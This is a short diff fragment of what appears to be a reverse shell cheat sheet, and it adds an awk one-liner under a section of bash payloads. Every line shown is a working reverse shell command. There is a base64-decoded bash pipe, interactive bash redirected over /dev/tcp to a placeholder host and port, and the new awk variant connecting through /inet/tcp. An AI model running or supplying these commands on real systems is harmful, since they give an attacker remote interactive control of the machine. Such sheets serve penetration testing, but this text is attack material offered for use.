@@ -5,6 +5,8 @@
 bash -c {echo,xxx}|{base64,-d}|{bash,-i}
 bash -c "bash -i >& /dev/tcp/ip/port  0>&1"
 bash -i 5<>/dev/tcp/host/port 0>&5 1>&5
+
+awk 'BEGIN{s="/inet/tcp/0/ip/port";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'
 ```
 ## java
 ```java
